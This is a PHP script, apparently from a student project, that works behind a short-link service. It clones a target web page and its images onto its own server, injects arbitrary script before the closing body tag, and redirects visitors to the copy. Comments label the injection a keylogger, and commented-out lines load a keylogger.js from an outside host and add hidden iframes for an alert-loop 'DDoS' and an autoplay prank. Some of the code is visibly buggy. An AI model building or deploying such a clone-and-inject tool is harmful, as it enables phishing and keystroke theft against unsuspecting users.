<?php
include "../scripts/simple_html_dom.php" ;
include "../php/DataBaseHandling.php";

function runScript($textToInsert){
$conn = openConnection();
//SEARCHING DATABASE WITH KEY TO GET LONGLINK
$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//$key = substr(strrchr($actual_link, "/"), 1);
$key = substr($_SERVER[REQUEST_URI],1,5);
$link = selectDataFromDatabase($key, $conn);

//DUPLICATING HTML FILE ONTO OWN SERVER
$htmlFileName = "index.html";
$html=fopen($htmlFileName, "w");
fwrite($html , file_get_contents("$link"));
fclose($html);

//CREATING PATHS FOR OTHER FILES FOUND IN HTML
$html = file_get_html($link);
foreach($html->find('img') as $element){
		$img = $element->src ;
    // Starts with http:// or https:// (case insensitive).
    if (preg_match('#^https?://#i', $img) === 0) {
      if (!is_dir("$img")){
          $path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
          mkdir(getcwd().$path , 0777 , true);
          copy($link.$img , getcwd().$img);
      }
      else{
            die('Failed to create folders...');
      }
    }
	};

//ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
//ADDING RICKROLL ATTACK TEST
//$keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
//$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
//$textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";



$contents = file_get_contents("$htmlFileName");
$newContent = preg_replace("</body>", $textToInsert."</body", $contents);
file_put_contents($htmlFileName, $newContent);

//REDIRECTING TO LONG LINK
header("Location:".$htmlFileName, true, 303);
die();
}

?>
